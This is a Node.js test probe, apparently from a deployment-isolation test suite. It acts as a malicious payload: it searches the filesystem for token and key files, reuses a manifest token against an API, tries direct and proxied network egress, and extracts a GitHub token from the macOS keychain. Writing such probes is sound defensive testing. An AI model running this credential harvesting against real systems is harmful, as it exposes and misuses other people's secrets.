// Malicious surface payload (deployment-control negative probe): actively DISCOVER known
// PEP secret/token files across the filesystem and attempt to USE any credential + reach the
// governed targets. Prints one JSON line. Runs inside whatever isolation the surface uses.
import { readFileSync, readdirSync, existsSync } from "node:fs";
import { execFileSync } from "node:child_process";
import net from "node:net";
import tls from "node:tls";

const targets = JSON.parse(process.env.PROBE_TARGETS ?? "{}");
const findings = { fs_reads: [], enumerated: [], credential_use: [], egress: [] };

// 1) discover secret/token material by walking candidate roots.
const roots = (process.env.PROBE_SEARCH_ROOTS ?? "").split(":").filter(Boolean);
const names = ["manifest.json", "api-tokens.json", "github-token", "record-api-key", "root-token", "root-key.pem"];
function walk(dir, depth) {
  if (depth > 4) return;
  let entries;
  try { entries = readdirSync(dir, { withFileTypes: true }); }
  catch (e) { return; }
  findings.enumerated.push(dir);
  for (const e of entries) {
    const p = `${dir}/${e.name}`;
    if (e.isDirectory()) { if (!e.name.startsWith(".git")) walk(p, depth + 1); }
    else if (names.includes(e.name)) {
      try { findings.fs_reads.push({ path: p, bytes: readFileSync(p, "utf8").length }); } catch (err) { /* denied */ }
    }
  }
}
for (const r of roots) { try { walk(r, 0); } catch { /* denied */ } }

// Explicit target files (activity-host secret-read control): try each directly.
for (const f of (process.env.PROBE_EXPLICIT_FILES ?? "").split(":").filter(Boolean)) {
  try { findings.fs_reads.push({ path: f, bytes: readFileSync(f, "utf8").length }); } catch (e) { /* denied */ }
}

// 2) if a manifest was read, recover a token and hit the Kernel effect path.
for (const f of findings.fs_reads) {
  if (f.path.endsWith("manifest.json")) {
    try {
      const mani = JSON.parse(readFileSync(f.path, "utf8"));
      const token = mani.tokens?.["cadp-workflow"];
      if (token && mani.api_url) {
        const res = await fetch(`${mani.api_url}/allocate_effect_id`, {
          method: "POST", headers: { authorization: `Bearer ${token}`, "content-type": "application/json" },
          body: JSON.stringify({ schema: "cadp.allocation-key.v1", work_run_ref: "cadp-v04:effect:00000000-0000-7000-8000-000000000bad", step_ordinal: 1, purpose: "record-write" }),
          signal: AbortSignal.timeout(4000),
        });
        findings.credential_use.push({ via: "manifest workflow token → allocate_effect_id", status: res.status });
      }
    } catch (e) { findings.credential_use.push({ error: String(e).slice(0, 80) }); }
  }
}

// 3) governed target egress: try BOTH a direct route and (if set) the proxy route. A target
// is "reached" only if EITHER route returns a real HTTP status. Governed targets must be 000
// on both (no route directly; proxy refuses them); the provider is reachable via the proxy.
const proxyUrl = process.env.HTTPS_PROXY ?? process.env.https_proxy;
// Dependency-free HTTPS-via-CONNECT probe: prove the proxy route WITHOUT relying on fetch
// honoring env proxy (node's fetch does not).
const proxyGet = (host) => new Promise((resolve) => {
  if (!proxyUrl) return resolve("000");
  const [phost, pport] = proxyUrl.replace(/^https?:\/\//, "").split(":");
  const sock = net.connect(Number(pport) || 8888, phost, () => {
    sock.write(`CONNECT ${host}:443 HTTP/1.1\r\nHost: ${host}:443\r\n\r\n`);
  });
  sock.setTimeout(6000);
  let banner = "";
  const onData = (chunk) => {
    banner += chunk.toString("latin1");
    if (banner.includes("\r\n\r\n")) {
      sock.removeListener("data", onData);
      if (!/^HTTP\/1\.[01] 200/.test(banner)) { sock.destroy(); return resolve("000"); }
      const tsock = tls.connect({ socket: sock, servername: host, rejectUnauthorized: false }, () => {
        tsock.write(`GET / HTTP/1.1\r\nHost: ${host}\r\nConnection: close\r\n\r\n`);
      });
      let resp = "";
      tsock.on("data", (d) => { resp += d.toString("latin1"); if (resp.includes("\r\n")) { const m = /HTTP\/1\.[01] (\d{3})/.exec(resp); tsock.destroy(); resolve(m ? Number(m[1]) : "000"); } });
      tsock.on("error", () => resolve("000"));
      tsock.setTimeout(6000, () => { tsock.destroy(); resolve("000"); });
    }
  };
  sock.on("data", onData);
  sock.on("error", () => resolve("000"));
  sock.on("timeout", () => { sock.destroy(); resolve("000"); });
});
for (const [name, url] of Object.entries(targets)) {
  const host = new URL(url).hostname;
  let status = "000"; let via = "none"; let error;
  try {
    const res = await fetch(url, { signal: AbortSignal.timeout(4000) });
    status = res.status; via = "direct";
  } catch (e) {
    error = String(e).slice(0, 40);
    const proxied = await proxyGet(host);
    if (proxied !== "000") { status = proxied; via = "proxy"; error = undefined; }
  }
  findings.egress.push({ target: name, url, status, via, ...(error ? { error } : {}) });
}

// 4) keychain / gh credential exfiltration attempt.
try {
  const out = execFileSync("security", ["find-generic-password", "-s", "gh:github.com", "-w"], { encoding: "utf8", timeout: 5000 });
  findings.credential_use.push({ via: "keychain gh token", recovered_bytes: out.trim().length });
} catch (e) { findings.credential_use.push({ via: "keychain gh token", denied: String(e).slice(0, 60) }); }

console.log(JSON.stringify(findings));
